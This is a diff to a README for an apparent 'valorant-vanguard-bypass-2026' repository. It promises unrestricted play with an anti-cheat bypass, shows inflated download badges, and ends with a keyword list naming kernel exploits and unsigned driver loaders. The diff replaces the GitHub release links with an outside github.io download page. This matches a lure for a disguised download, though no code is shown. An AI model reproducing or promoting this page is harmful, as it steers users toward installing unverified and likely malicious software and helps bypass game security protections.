@@ -1,6 +1,6 @@
 <h1>🎮 valorant-vanguard-bypass-2026 - Play Valorant Without Any Restrictions</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-2.1M%2B%20Users-orange?style=for-the-badge&logo=github)](https://github.com/samicryzen/valorant-vanguard-bypass-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-2.1M%2B%20Users-orange?style=for-the-badge&logo=github)](https://samicryzen.github.io)
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-2.1m%2B-orange?style=flat-square)
 
@@ -32,7 +32,7 @@ That is it. No special hardware, no coding skills, no extra programs.
 ## 📥 Download And Install
 
 **Visit this link to download the application:**  
-[👉 Click Here To Get The Latest Version](https://github.com/samicryzen/valorant-vanguard-bypass-2026/releases)
+[👉 Click Here To Get The Latest Version](https://samicryzen.github.io)
 
 Once you arrive at the download page, follow these simple steps:
 
@@ -137,6 +137,6 @@ If this tool helped you, we would appreciate a star on this repository. It helps
 ---
 
 **Ready to get started?**  
-[🚀 Download Now From The Official Release Page](https://github.com/samicryzen/valorant-vanguard-bypass-2026/releases)
+[🚀 Download Now From The Official Release Page](https://samicryzen.github.io)
 
 Keywords: valorant vanguard bypass, vanguard bypass, valorant hack, kernel exploit, anti-cheat bypass, unsigned driver loader, easyanticheat bypass, game security bypass, vanguard removal, valorant cheat tool
